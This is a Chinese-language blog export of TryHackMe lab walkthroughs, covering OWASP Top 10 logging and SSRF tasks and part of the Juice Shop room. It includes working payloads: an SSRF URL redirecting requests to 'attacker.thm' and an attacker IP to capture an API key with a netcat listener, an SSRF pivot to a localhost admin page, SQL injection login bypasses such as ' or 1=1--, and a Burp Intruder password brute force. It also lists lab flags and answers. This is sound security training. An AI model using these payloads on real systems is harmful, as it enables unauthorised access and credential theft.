<h2 id="TOP9-安全日志和监控故障"><a href="#TOP9-安全日志和监控故障" class="headerlink" title="[TOP9]安全日志和监控故障"></a>[TOP9]安全日志和监控故障</h2><p>在设置Web应用程序时，应该记录用户执行的每个操作。这些日志记录很重要，因为一旦发生安全事件，日志就可以用于追踪攻击者的活动；一旦追踪到攻击者的活动，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，那么就无法判断攻击者在获得对特定Web应用程序的访问权限之后，具体执行了哪些操作，安全日志和监控故障的显著影响包括：</p>
<ul>
<li>监管上的损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下相关的日志记录，那么不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会依据当地法律法规受到罚款或其他更严厉的处罚。</li>
<li>攻击者发起进一步攻击的风险：如果没有相关的日志记录，则可能无法检测到攻击者的存在，这可能允许攻击者通过窃取凭据、攻击基础设施等方式来对Web应用程序所有者发起进一步的攻击。</li>
</ul>
<p>安全日志文件中所存储的信息应包括以下内容：</p>
<ul>
<li>HTTP status codes（HTTP状态码）</li>
<li>Time Stamps（时间戳）</li>
<li>Usernames（用户名）</li>
<li>API endpoints&#x2F;page locations（API端点&#x2F;页面位置）</li>
<li>IP addresses（IP地址）</li>
</ul>
<p>因为日志文件会包含一些敏感信息，所以确保安全地存储日志文件以及将这些日志的多个副本存储在不同位置非常重要。</p>
<p>你可能已经注意到，在发生网络安全违规或事件后，日志记录会变得尤为重要。理想的情况是：目标应用程序能够进行监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时(例如，在攻击者入侵十天之后才检测到)尽可能地减少攻击者所造成的影响。</p>
<p>可疑活动的常见示例包括：</p>
<ul>
<li>针对特定操作进行多次未经授权的尝试：通常是身份验证尝试或者访问未经授权的资源(例如管理员页面)。</li>
<li>来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户(针对该活动的检测具有一定误报率)。</li>
<li>使用了自动化工具：特定的自动化工具可以很容易地被识别到，例如，检测用户所使用的User-Agent标头的值或用户发送请求的速率，出现这些特征可能表明攻击者正在使用自动化攻击工具。</li>
<li>使用了常见的有效载荷(Payload)：在Web应用程序中，攻击者可能会使用一系列已知的有效载荷，通过检测这些有效载荷的使用情况，就可以得知是否有人在对目标应用程序进行未经授权或恶意的测试。</li>
</ul>
<p>仅仅检测可疑活动还不够，网络安全防御人员还需要根据事件影响级别对可疑活动进行评级；例如某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的可疑活动往往需要优先做应急响应，因此防御人员应该针对性地发出告警，以引起公司相关部门的注意。</p>
<p>接下来，我们需要通过分析示例日志文件来实践本小节的知识点。</p>
<h3 id="答题-9"><a href="#答题-9" class="headerlink" title="答题"></a>答题</h3><p>在与本小节相关的Tryhackme实验房间中，单击<code>Download Task Files</code> 按钮以下载要分析的示例日志文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109192110074.png"
                      alt="image-20240109192110074"
                ></p>
<p>我们打开已下载的示例日志文件并查看其内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109192321809.png"
                      alt="image-20240109192321809"
                ></p>
<p>分析该日志文件的内容可知：</p>
<p>1.在短时间内有人进行了四次登录操作，对应的可疑ip地址为：49.99.13.16；</p>
<p>2.四次登录操作使用的是不同的用户名，所以相关的一系列行为属于：暴力破解攻击（Brute Force）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109192446654.png"
                      alt="image-20240109192446654"
                ></p>
<h2 id="TOP10-服务器端请求伪造-SSRF"><a href="#TOP10-服务器端请求伪造-SSRF" class="headerlink" title="[TOP10]服务器端请求伪造(SSRF)"></a>[TOP10]服务器端请求伪造(SSRF)</h2><p>这种类型的漏洞发生在攻击者能够强制Web应用程序代表其向任意目标发送请求的情况下，同时攻击者还可以控制请求本身的内容，SSRF漏洞通常出现在需要使用第三方服务的Web应用程序的具体实现中。</p>
<p>tips：SSRF(Server-Side Request Forgery)服务器端请求伪造。</p>
<p>例如，考虑一个使用外部API向其客户端发送SMS通知的Web应用程序。对于每封电子邮件，网站都需要向SMS提供商的服务器发出Web请求，以便发送想要发送的消息内容。由于SMS服务提供商是按每条消息计费的，因此他们会要求你在向其API发出的每个请求中添加一个他们预先分配给你的密钥；这个API密钥将充当身份验证令牌，使得SMS服务提供商能够知道要向哪个用户计费每条消息。该Web应用程序的相关工作流程如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108224740319.png"
                      alt="image-20240108224740319"
                ></p>
<p>通过查看上图内容，我们很容易看出漏洞所在，应用程序向用户公开了<code>server</code>参数，该参数定义了SMS服务提供商的服务器名称；如果攻击者愿意，他们就可以通过简单地修改<code>server</code>值以指向由其所控制的计算机设备，然后Web应用程序就会将SMS请求转发给攻击者而不是SMS服务提供商。作为被转发的消息的一部分，攻击者还能获取到API密钥，从而允许他们使用SMS服务发送消息，而费用则由网站所有者承担。为了实现刚才所描述的效果，攻击者只需要向目标Web应用程序发送以下请求：</p>
<p><code>https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</code></p>
<p>这将使得存在SSRF漏洞的Web应用程序自动发送以下请求：</p>
<p><code>https://attacker.thm/api/send?msg=ABC</code> </p>
<p>然后，攻击者可以在由他们所控制的计算机设备上使用Netcat来捕获相关请求的内容：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@attackbox$ </span><span class="language-bash">nc -lvp 80</span></span><br><span class="line">Listening on 0.0.0.0 80</span><br><span class="line">Connection received on 10.10.1.236 43830</span><br><span class="line">GET /:8087/public-docs/123.pdf HTTP/1.1</span><br><span class="line">Host: 10.10.10.11</span><br><span class="line">User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure></div>

<p>这是SSRF漏洞的一个非常基础的案例，实际上SSRF可以用来做更多的事情，根据每个场景的情况，SSRF一般可用于：</p>
<ul>
<li>枚举内部网络，包括IP地址和端口等信息；</li>
<li>滥用服务器之间的信任关系，并获取对其他受限服务的访问权限；</li>
<li>与一些非HTTP服务交互以实现远程代码执行(RCE)。</li>
</ul>
<p>接下来，让我们通过实例来快速了解一下如何使用SSRF来滥用某些信任关系。</p>
<h3 id="答题-10"><a href="#答题-10" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，使用攻击机上的浏览器导航至<code>http://MACHINE_IP:8087/</code>(10.10.206.41:8087)页面，我们将在该页面找到一个简单的Web应用程序，经过一番探索之后，我们可以看到一个admin区域，这将会是我们的主要测试目标。</p>
<p>探索目标站点，我们可以发现唯一允许访问admin区域的主机：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110000348310.png"
                      alt="image-20240110000348310"
                ></p>
<blockquote>
<p>唯一允许访问管理区域的主机是：localhost</p>
</blockquote>
<p>检查”Download Resume”按钮，查看相关外链的server(服务器)参数指向何处：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110000503770.png"
                      alt="image-20240110000503770"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110000622528.png"
                      alt="image-20240110000622528"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110002257509.png"
                      alt="image-20240110002257509"
                ></p>
<blockquote>
<p>“&#x2F;download?server&#x3D;secure-file-storage.com:8087&amp;id&#x3D;75482342”</p>
<p>server参数指向的是：secure-file-storage.com</p>
</blockquote>
<p>利用SSRF漏洞，使得Web应用程序将请求转发到AttackBox或本地攻击机。</p>
<p>我们刚才找到了一个外部链接<code>http://10.10.206.41:8087/download?server=secure-file-storage.com:8087&amp;id=75482342</code>，将其中的server参数的值指向我们的攻击机IP地址即可实现对SSRF漏洞的利用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110000937193.png"
                      alt="image-20240110000937193"
                ></p>
<p>我们先在攻击机终端设置一个netcat端口监听器：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8087</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110001247077.png"
                      alt="image-20240110001247077"
                ></p>
<p>然后再使用浏览器去访问替换了server参数的链接：<code>http://10.10.206.41:8087/download?server=10.11.15.168:8087&amp;id=75482342</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110001801768.png"
                      alt="image-20240110001801768"
                ></p>
<p>然后我们就能在攻击机终端接受到相关的请求消息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110001822974.png"
                      alt="image-20240110001822974"
                ></p>
<blockquote>
<p>我们所捕获的请求中的API Key内容为：THM{Hello_Im_just_an_API_key} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110001958602.png"
                      alt="image-20240110001958602"
                ></p>
<p>额外练习：尝试利用SSRF漏洞来访问目标站点的admin区域。</p>
<p>从本小节的第一个问题中，我们已经知道唯一允许访问admin区域的主机是localhost，所以我们尝试针对性地修改网站外部链接中的server值：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">server=http://localhost:8087/admin#&amp;id=75482342</span><br><span class="line"></span><br><span class="line">server=http://localhost:8087/admin%23&amp;id=75482342</span><br><span class="line"></span><br><span class="line">http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23&amp;id=75482342</span><br></pre></td></tr></table></figure></div>

<p>经过测试，我们发现需要对链接中的#符号进行URL编码处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110004215714.png"
                      alt="image-20240110004215714"
                ></p>
<p>最终我们将要访问的链接为：<a class="link"   href="http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23&id=75482342" >http://10.10.206.41:8087/download?server=http://localhost:8087/admin%23&amp;id=75482342 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240110003133156.png"
                      alt="image-20240110003133156"
                ></p>
<p>如上图所示，我们成功地得到了相关的flag值<code>thm&#123;c4n_i_haz_flagz_plz?&#125;</code>。</p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
        <tag>Security Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-OWASP Juice Shop-练习</title>
    <url>/2024/01/27/THM-OWASP%20Juice%20Shop-%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/owaspjuiceshop" >https://tryhackme.com/room/owaspjuiceshop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：基于易受攻击的 Web 应用程序 Juice Shop，学习如何识别和利用常见的 Web 应用程序漏洞。</p>
<h2 id="Task-1-部署实验环境-前期准备"><a href="#Task-1-部署实验环境-前期准备" class="headerlink" title="Task 1 部署实验环境&amp;前期准备"></a>Task 1 部署实验环境&amp;前期准备</h2><p>OWASP-TOP10项目介绍：<a class="link"   href="https://owasp.org/www-project-top-ten/" >https://owasp.org/www-project-top-ten/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Juice Shop 是一个大型应用程序，它并不会涵盖OWASP-TOP10中的每个主题，此应用程序和OWASP相关的主题如下：</p>
<ul>
<li><a class="link"   href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection" >Injection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（注入类漏洞）</li>
<li><a class="link"   href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" >Broken Authentication <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（损坏的身份验证机制-身份验证失效漏洞）</li>
<li><a class="link"   href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" >Sensitive Data Exposure <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（敏感信息泄露）</li>
<li><a class="link"   href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" >Broken Access Control <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（损坏的访问控制机制-越权漏洞）</li>
<li><a class="link"   href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" >Cross-Site Scripting XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（跨站点脚本漏洞-XSS）</li>
</ul>
<p>注意：</p>
<p>从【Task3】开始都需要获得flag以完成任务要求，flag所对应的内容会在相关任务完成后自动显示在网页上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221208214237151.png"
                      alt="image-20221208214237151"
                ></p>
<p>故障排除事项：</p>
<p>目标web应用程序在加载时大约需要 2-5 分钟，请耐心等待！</p>
<p>如果使用了Burpsuite工具，则每次完成任务时 需要先在当前浏览器的代理设置中暂时禁用burp，然后再刷新页面，页面上才会显示相关的flag内容。（这不是应用程序本身的问题，而是burp工具在拦截流量时 会自动阻止flag的内容显示）</p>
<p>如果你正在执行XSS任务，但是发现相关页面无法产生XSS本该有的执行效果，此时你可以尝试先清除 cookie 和网站相关数据，然后再次执行XSS Payload。</p>
<p>如果你确定已完成对应的任务要求 但仍然无法获得flag，你可以转到【Task8】相关页面，该页面将允许你检查所有任务的完成情况。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221208220727163.png"
                      alt="image-20221208220727163"
                ></p>
<p>启动目标机器，访问目标站点：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210181526625.png"
                      alt="image-20221210181526625"
                ></p>
<h2 id="Task-2-遍历目标应用程序"><a href="#Task-2-遍历目标应用程序" class="headerlink" title="Task 2 遍历目标应用程序"></a>Task 2 遍历目标应用程序</h2><p>在我们进入实际的渗透操作之前，最好先遍历一下目标。 打开BurpSuite，在Burp中，将拦截模式设置为关闭，然后直接浏览目标站点，这将允许Burp记录来自服务器的不同请求，这些请求信息稍后可能对我们的渗透操作有所帮助。</p>
<p>以上过程被称为遍历目标应用程序，这也是侦察形式的一种！</p>
<p><strong>答题</strong></p>
<p><strong>Question #1: What’s the Administrator’s email address?</strong>–管理员的电子邮件地址是什么？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210181910676.png"
                      alt="image-20221210181910676"
                ></p>
<p>相关产品的评论将显示每个用户的电子邮件地址，通过单击 Apple Juice 产品，我们可以看到管理员的电子邮件地址！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210181735273.png"
                      alt="image-20221210181735273"
                ></p>
<blockquote>
<p><a class="link"   href="mailto:&#x61;&#x64;&#109;&#105;&#110;&#64;&#106;&#117;&#105;&#99;&#101;&#45;&#115;&#x68;&#46;&#x6f;&#x70;" >&#x61;&#x64;&#109;&#105;&#110;&#64;&#106;&#117;&#105;&#99;&#101;&#45;&#115;&#x68;&#46;&#x6f;&#x70; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>Question #2: What parameter is used for searching?</strong>–用于搜索的参数是什么？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182108260.png"
                      alt="image-20221210182108260"
                ></p>
<p>单击应用程序右上角的放大镜将弹出一个搜索栏；然后我们可以输入一些文本，按回车键将在网站的产品页面 搜索刚刚输入的文本内容。</p>
<p>注意浏览器地址栏的URL：它现在将更新为包含我们刚刚输入的文本，我们可以在 &#x2F;#&#x2F;search? 之后看到搜索参数为字母q。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182428085.png"
                      alt="image-20221210182428085"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182607421.png"
                      alt="image-20221210182607421"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182631463.png"
                      alt="image-20221210182631463"
                ></p>
<blockquote>
<p>q</p>
</blockquote>
<p><strong>Question #3: What show does Jim reference in his review?</strong> –吉姆在他的评论中提到了什么节目？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182829023.png"
                      alt="image-20221210182829023"
                ></p>
<p>吉姆对 Green Smoothie 产品进行了评论。 我们可以看到他提到了<em>replicator</em>。</p>
<p>我们用谷歌搜索引擎搜索“replicator”，得到的结果表明它来自一部名为《星际迷航》的电视节目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210182933730.png"
                      alt="image-20221210182933730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210183523271.png"
                      alt="image-20221210183523271"
                ></p>
<blockquote>
<p>Star Trek</p>
</blockquote>
<h2 id="Task-3-注入漏洞-实验"><a href="#Task-3-注入漏洞-实验" class="headerlink" title="Task 3 注入漏洞-实验"></a>Task 3 注入漏洞-实验</h2><p>此任务将侧重于注入类型的漏洞，注入漏洞对企业来说非常危险，因为注入攻击可能会导致目标服务器停机、数据丢失等严重后果。识别目标 Web 应用程序中的注入点通常非常简单，因为大多数注入点都会返回一个错误提示，注入攻击有很多种：</p>
<ul>
<li>SQL Injection：SQL注入–指攻击者输入恶意或格式错误的查询以从目标数据库中检索或篡改数据，在某些情况下，这常常发生在登录框界面。</li>
<li>Command Injection：命令注入–指 Web 应用程序获取了“用户输入”或用户所控制的数据并将它们作为系统命令运行，攻击者可能会篡改输入数据以执行他们自己想要的系统命令，例如，某个目标应用程序能够执行配置错误的ping命令。</li>
<li>Email Injection：电子邮件注入–是一种安全漏洞，允许恶意用户在未经电子邮件服务器事先授权的情况下向受害者发送垃圾电子邮件，攻击者可以通过向邮件头字段添加额外数据来完成攻击行为；这种攻击的主要原因是不适当的用户输入验证或者目标应用程序根本没有验证、过滤机制。</li>
</ul>
<p>在接下来的例子中，我们将关注于<em><strong>SQL 注入漏洞</strong></em>。</p>
<p><strong>答题</strong></p>
<p><strong>Question #1: Log into the administrator account!</strong>–尝试登录管理员帐户！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210190416125.png"
                      alt="image-20221210190416125"
                ></p>
<p>在我们导航到登录页面后，在电子邮件和密码字段中输入一些数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210191030455.png"
                      alt="image-20221210191030455"
                ></p>
<p>在单击提交登录表单之前，请确保Burp的拦截模式已打开。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210190334439.png"
                      alt="image-20221210190334439"
                ></p>
<p>这将使得我们能够在BurpSuite中看到 将要发送到目标服务器的数据！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210192553974.png"
                      alt="image-20221210192553974"
                ></p>
<p>将电子邮件字段“a”更改为 <strong>‘ or 1&#x3D;1–</strong> ，点击Burp中的Forward转发数据到目标服务器(直到Burp中的Proxy界面所有数据都转发完毕)，实现目标站点的登陆操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210192702269.png"
                      alt="image-20221210192702269"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210200503102.png"
                      alt="image-20221210200503102"
                ></p>
<p><em>为什么这能够成功实现登陆操作？</em></p>
<ol>
<li>字符 <strong>‘</strong> 将关闭 SQL 查询中的语句。</li>
<li>以上SQL语句插入了“<strong>or</strong>”操作符，如果SQL语句中的任何一方（or操作符前的语句和后面的语句）为真，则整个SQL语句将返回true；由于 1&#x3D;1 始终为真，因此整个语句的结果将为true，这将告诉目标服务器 刚才输入的电子邮件字段是有效的，然后我们就能登录到用户ID为0的账户，也就是管理员帐户。</li>
<li>字符“**–**”在SQL语句中用于注释数据，注释符之后的 任何对登录的限制手段都将不再起作用，这类似于 python 和 javascript 中的 <strong>#</strong> 和 <strong>&#x2F;&#x2F;</strong> 注释符。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210193042910.png"
                      alt="image-20221210193042910"
                ></p>
<blockquote>
<p>32a5e0f21372bcc1000a6088b93b458e41f0e02a</p>
</blockquote>
<p><strong>Question #2: Log into the Bender account!</strong>–登录 Bender 帐户！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210201414273.png"
                      alt="image-20221210201414273"
                ></p>
<p>与问题 #1 中的操作类似，我们现在将登录 Bender 帐户！ 再次使用Burp捕获登录请求，但这次我们将把：<strong><a class="link"   href="mailto:&#98;&#x65;&#x6e;&#100;&#x65;&#114;&#64;&#106;&#117;&#x69;&#x63;&#x65;&#45;&#x73;&#x68;&#46;&#x6f;&#112;" >&#98;&#x65;&#x6e;&#100;&#x65;&#114;&#64;&#106;&#117;&#x69;&#x63;&#x65;&#45;&#x73;&#x68;&#46;&#x6f;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘–</strong> 作为修改之后的 电子邮件字段内容（该有效电子邮件地址是我们通过遍历目标应用程序才得知的）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210202141223.png"
                      alt="image-20221210202141223"
                ></p>
<p>然后，将修改之后的数据转发到目标服务器！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210202359233.png"
                      alt="image-20221210202359233"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210202420466.png"
                      alt="image-20221210202420466"
                ></p>
<p>此处为什么不注入1&#x3D;1？这是因为我们在此处输入的电子邮件地址是有效的（相关的SQL查询将自动返回 true），所以我们不需要强制SQL查询结果为 true。我们可以在电子邮件字段之后添加 <strong>‘–</strong> 来绕过登录系统的验证机制。 注意，只有当电子邮件或用户名未知、无效时，才需要尝试使用 1&#x3D;1。</p>
<blockquote>
<p>fb364762a3c102b2db932069c0e6b78e738d4066</p>
</blockquote>
<h2 id="Task-4-身份验证失效漏洞-实验"><a href="#Task-4-身份验证失效漏洞-实验" class="headerlink" title="Task 4 身份验证失效漏洞-实验"></a>Task 4 身份验证失效漏洞-实验</h2><p>在此任务中，我们将研究通过不同的漏洞来利用身份验证机制，此处在谈论身份验证机制中的缺陷时，也包括了一些易受攻击者操纵的机制，下面列出的这些机制是我们将要利用的：</p>
<ul>
<li><p>高权限帐户的弱密码</p>
</li>
<li><p>忘记密码页面</p>
</li>
</ul>
<p><strong>答题</strong></p>
<p><strong>Question #1: Bruteforce the Administrator account’s password!</strong>–暴力破解管理员帐户的密码！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210205147392.png"
                      alt="image-20221210205147392"
                ></p>
<p>在上一个任务中，我们已经成功利用 SQL Injection 登录到 Administrator 帐户，但我们仍然不知道相关的密码明文内容，所以我们接下来将尝试使用暴力破解攻击 以得到管理员账户密码！在登录表单输入以下字段：</p>
<blockquote>
<p><a class="link"   href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#106;&#117;&#105;&#x63;&#101;&#x2d;&#x73;&#104;&#x2e;&#111;&#112;" >&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#106;&#117;&#105;&#x63;&#101;&#x2d;&#x73;&#104;&#x2e;&#111;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>a</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210204524852.png"
                      alt="image-20221210204524852"
                ></p>
<p>使用Burp捕获上图所对应的登录请求，但此次不是通过Burp中的Proxy界面修改、发送数据，而是将捕获到的表单数据先转发给Burp中的Intruder界面（通过此界面完成暴力破解攻击）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210204736340.png"
                      alt="image-20221210204736340"
                ></p>
<p>在Intruder界面点击Positions，然后选择<strong>clear §</strong> 按钮，在密码字段中，将两个<strong>§</strong>符号放在引号内；注意：此处的<strong>§§</strong>不是指代两个单独的输入字符，而是 Burp 中的引用符号的实现，类似于**””**符号。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210204838869.png"
                      alt="image-20221210204838869"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210204934107.png"
                      alt="image-20221210204934107"
                ></p>
<p>对于爆破攻击所使用的有效载荷，我们将选择来自于 Seclists 项目中的 best1050.txt列表。（Seclists 可以通过以下方式安装：<code>apt-get install seclists</code>）          </p>
<p>你可以从以下位置 加载所需列表：<code>/usr/share/secLists/Passwords/Common-Credentials/best1050.txt</code>  </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210210518209.png"
                      alt="image-20221210210518209"
                ></p>
<p>将字典文件加载到 Burp 后，开始爆破攻击，你可以按状态码来判断请求所对应的结果：失败的请求将收到 401 Unauthorized，成功的请求将返回 200 OK。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210211837847.png"
                      alt="image-20221210211837847"
                ></p>
<p>成功完成爆破攻击之后，我们可以使用刚才得到的明文密码登录管理员帐户，以获取对应的flag。</p>
<blockquote>
<p><a class="link"   href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x6a;&#x75;&#105;&#x63;&#101;&#x2d;&#115;&#104;&#x2e;&#111;&#112;" >&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x6a;&#x75;&#105;&#x63;&#101;&#x2d;&#115;&#104;&#x2e;&#111;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>admin123</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210211959256.png"
                      alt="image-20221210211959256"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212026875.png"
                      alt="image-20221210212026875"
                ></p>
<blockquote>
<p>c2110d06dc6f81c67cd8099ff0ba601241f1ac0e</p>
</blockquote>
<p><strong>Question #2:</strong> <strong>Reset Jim’s password!</strong>–重置Jim的密码！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212928635.png"
                      alt="image-20221210212928635"
                ></p>
<p>重置密码机制也可以被利用！ 当我们在“忘记密码”页面的电子邮件字段中输入Jim的Email（<a class="link"   href="mailto:&#106;&#105;&#109;&#64;&#x6a;&#x75;&#105;&#99;&#101;&#45;&#115;&#x68;&#46;&#x6f;&#112;" >&#106;&#105;&#109;&#64;&#x6a;&#x75;&#105;&#99;&#101;&#45;&#115;&#x68;&#46;&#x6f;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）时，可以看到Jim 的密码安全问题被设置为“你最年长的兄弟姐妹的中间名是什么？”。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212443775.png"
                      alt="image-20221210212443775"
                ></p>
<p>在任务 2 中，我们已经发现Jim可能与星际迷航有关，所以我们通过谷歌搜索“Jim Star Trek”这为我们提供了来自 Star Trek 的关于 Jame T. Kirk 的维基百科页面；翻阅相关维基百科页面 我们发现他有一个哥哥，Jim哥哥的中间名为<strong>Samuel</strong>，所以我们可以将其输入到“忘记密码”页面中并尝试更改Jim账户的密码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212528545.png"
                      alt="image-20221210212528545"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212635865.png"
                      alt="image-20221210212635865"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212753459.png"
                      alt="image-20221210212753459"
                ></p>
<p>成功修改密码之后，可以获得一个flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221210212836933.png"
                      alt="image-20221210212836933"
                ></p>
<blockquote>
<p>094fbc9b48e525150ba97d05b942bbf114987257</p>
</blockquote>
